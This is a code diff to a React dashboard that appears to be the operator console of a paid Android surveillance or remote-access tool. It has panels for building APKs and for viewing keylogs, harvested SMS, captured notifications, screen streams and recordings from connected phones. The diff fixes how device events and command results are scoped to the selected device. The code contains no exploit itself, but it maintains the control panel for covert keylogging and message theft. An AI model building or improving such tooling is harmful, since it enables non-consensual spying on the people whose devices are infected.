@@ -8,6 +8,7 @@ import SettingsTab from './SettingsTab.jsx';
 import BuildApkTab from './BuildApkTab.jsx';
 import TelegramTab from './TelegramTab.jsx';
 import PaywallOverlay from './PaywallOverlay.jsx';
+import { deviceCommandKey, shouldProcessDeviceEvent } from '../utils/deviceEventScope.mjs';
 
 const styles = {
   trialBanner: {
@@ -162,6 +163,8 @@ function TrialBanner({ user, subscription }) {
 export default function UserDashboard({ user, onLogout }) {
   const [devices, setDevices]                         = useState([]);
   const [selectedDevice, setSelectedDevice]           = useState(null);
+  const selectedDeviceRef = useRef(selectedDevice);
+  selectedDeviceRef.current = selectedDevice;
   const mainContentRef = useRef(null);
   const [globalView, setGlobalView]                   = useState('overview');
   const [commandResults, setCommandResults]           = useState([]);
@@ -178,6 +181,12 @@ export default function UserDashboard({ user, onLogout }) {
   const [deviceLatencies, setDeviceLatencies]         = useState({});
   const pingPendingRef  = useRef({});
   const chunkStreamsRef = useRef({});
+
+  const selectDevice = useCallback((deviceId) => {
+    const nextDeviceId = deviceId || null;
+    selectedDeviceRef.current = nextDeviceId;
+    setSelectedDevice(nextDeviceId);
+  }, []);
 
   useEffect(() => {
     mainContentRef.current?.scrollTo({ top: 0, behavior: 'auto' });
@@ -222,12 +231,15 @@ export default function UserDashboard({ user, onLogout }) {
   }, [refreshSubscription]);
 
   const handleMessage = useCallback((event, data) => {
+    if (!shouldProcessDeviceEvent(event, data, selectedDeviceRef.current)) return;
     switch (event) {
       case 'device:list':
         setDevices(Array.isArray(data) ? data : []);
         break;
       case 'device:connected':
-        setActivityLog(prev => [{ id: Date.now(), type: 'connect', text: `Device connected: ${data.deviceId}`, time: new Date() }, ...prev].slice(0, 100));
+        if (!selectedDeviceRef.current || selectedDeviceRef.current === data.deviceId) {
+          setActivityLog(prev => [{ id: Date.now(), type: 'connect', deviceId: data.deviceId, text: `Device connected: ${data.deviceId}`, time: new Date() }, ...prev].slice(0, 100));
+        }
         if (data.deviceId && data.deviceInfo) {
           setDevices(prev => {
             const exists = prev.find(d => d.deviceId === data.deviceId);
@@ -244,7 +256,9 @@ export default function UserDashboard({ user, onLogout }) {
         }
         break;
       case 'device:disconnected':
-        setActivityLog(prev => [{ id: Date.now(), type: 'disconnect', text: `Device disconnected: ${data.deviceId}`, time: new Date() }, ...prev].slice(0, 100));
+        if (!selectedDeviceRef.current || selectedDeviceRef.current === data.deviceId) {
+          setActivityLog(prev => [{ id: Date.now(), type: 'disconnect', deviceId: data.deviceId, text: `Device disconnected: ${data.deviceId}`, time: new Date() }, ...prev].slice(0, 100));
+        }
         setDevices(prev => prev.map(d => d.deviceId === data.deviceId ? { ...d, isOnline: false } : d));
         break;
       case 'device:heartbeat':
@@ -297,17 +311,20 @@ export default function UserDashboard({ user, onLogout }) {
       case 'data:chunk': {
         const { commandId, command, fieldName, chunk, done, error, deviceId } = data;
         if (!commandId) break;
-        if (!chunkStreamsRef.current[commandId]) chunkStreamsRef.current[commandId] = { command, fieldName, deviceId, items: [] };
-        const stream = chunkStreamsRef.current[commandId];
+        const streamKey = deviceCommandKey(deviceId, commandId);
+        if (!chunkStreamsRef.current[streamKey]) chunkStreamsRef.current[streamKey] = { command, fieldName, deviceId, items: [] };
+        const stream = chunkStreamsRef.current[streamKey];
+        if (command && !stream.command) stream.command = command;
+        if (deviceId && !stream.deviceId) stream.deviceId = deviceId;
         if (fieldName && !stream.fieldName) stream.fieldName = fieldName;
         if (chunk && Array.isArray(chunk)) for (const item of chunk) stream.items.push(item);
         if (done) {
-          delete chunkStreamsRef.current[commandId];
+          delete chunkStreamsRef.current[streamKey];
           if (error) {
-            setCommandResults(prev => [{ id: commandId, command: stream.command, deviceId: stream.deviceId, success: false, error, response: null, time: new Date() }, ...prev].slice(0, 200));
+            setCommandResults(prev => [{ id: deviceCommandKey(deviceId, commandId), command: stream.command, deviceId: stream.deviceId, success: false, error, response: null, time: new Date() }, ...prev].slice(0, 200));
           } else {
             const field = stream.fieldName || 'items';
-            setCommandResults(prev => [{ id: commandId, command: stream.command, deviceId: stream.deviceId, success: true, response: { success: true, [field]: stream.items, count: stream.items.length }, error: null, time: new Date() }, ...prev].slice(0, 200));
+            setCommandResults(prev => [{ id: `${deviceCommandKey(deviceId, commandId)}:chunk`, command: stream.command, deviceId: stream.deviceId, success: true, response: { success: true, [field]: stream.items, count: stream.items.length }, error: null, time: new Date() }, ...prev].slice(0, 200));
             setActivityLog(prev => [{ id: Date.now(), type: 'success', text: `${stream.command} → OK (${stream.items.length} items)`, time: new Date() }, ...prev].slice(0, 100));
           }
           setPendingCommands(prev => { const n = { ...prev }; delete n[commandId]; return n; });
@@ -416,6 +433,33 @@ export default function UserDashboard({ user, onLogout }) {
   }, [send]);
 
   useEffect(() => {
+    chunkStreamsRef.current = {};
+    setCommandResults(prev => selectedDevice ? prev.filter(result => result.deviceId === selectedDevice) : []);
+    setPendingCommands(prev => selectedDevice
+      ? Object.fromEntries(Object.entries(prev).filter(([, command]) => command.deviceId === selectedDevice))
+      : {});
+    setActivityLog([]);
+    const keepSelected = entries => selectedDevice
+      ? entries.filter(entry => entry.deviceId === selectedDevice)
+      : [];
+    const keepSelectedMap = map => selectedDevice && map[selectedDevice]
+      ? { [selectedDevice]: map[selectedDevice] }
+      : {};
+    setStreamFrames(keepSelectedMap);
+    setKeylogPushEntries(keepSelected);
+    setNotifPushEntries(keepSelected);
+    setActivityAppEntries(keepSelected);
+    setSmsHuntEntries(keepSelected);
+    setScreenReaderPushData(keepSelectedMap);
+    setOfflineRecordingVersion(keepSelectedMap);
+    setDeviceLatencies(keepSelectedMap);
+  }, [selectedDevice]);
+
+  useEffect(() => {
+    if (connected) send('dashboard:select_device', { deviceId: selectedDevice });
+  }, [selectedDevice, connected, send]);
+
+  useEffect(() => {
     if (!connected) return;
     const tick = () => send('dashboard:ping', { sentAt: Date.now() });
     tick();
@@ -441,7 +485,7 @@ export default function UserDashboard({ user, onLogout }) {
         <Sidebar
           devices={devices}
           selectedDevice={selectedDevice}
-          onSelectDevice={setSelectedDevice}
+          onSelectDevice={selectDevice}
         />
         <main ref={mainContentRef} className="main-content" style={{ position: 'relative' }}>
           {selectedDevice ? (
@@ -454,7 +498,7 @@ export default function UserDashboard({ user, onLogout }) {
                 isAdmin={false}
                 results={commandResults.filter(r => r.deviceId === selectedDevice)}
                 pending={Object.values(pendingCommands).filter(c => c.deviceId === selectedDevice)}
-                onBack={() => setSelectedDevice(null)}
+                onBack={() => selectDevice(null)}
                 streamFrame={streamFrames[selectedDevice] || null}
                 send={send}
                 keylogPushEntries={keylogPushEntries.filter(e => e.deviceId === selectedDevice)}
@@ -472,7 +516,7 @@ export default function UserDashboard({ user, onLogout }) {
                 email={subscription.email || user?.email}
                 paywall={paywall}
                 trialEndDate={subscription.trialEndDate || user?.trialEndDate}
-                onBack={() => setSelectedDevice(null)}
+                onBack={() => selectDevice(null)}
                 onRefresh={refreshSubscription}
               />
             )
@@ -521,7 +565,7 @@ export default function UserDashboard({ user, onLogout }) {
                   <Overview
                     devices={devices}
                     activityLog={activityLog}
-                    onSelectDevice={setSelectedDevice}
+                    onSelectDevice={selectDevice}
                     connected={connected}
                   />
                 )}
